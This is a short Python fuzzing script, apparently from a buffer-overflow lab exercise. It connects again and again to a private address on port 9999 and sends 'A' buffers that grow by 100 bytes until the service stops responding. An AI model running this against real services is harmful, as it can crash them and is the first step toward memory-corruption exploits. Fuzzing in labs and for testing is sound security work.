#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.42.128',9999))
        s.send('lol')
        sleep(1)
        s.send((buffer))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    except:
        print('Fuzzing crashed at %s bytes' % str(len(buffer)))
        sys.exit()
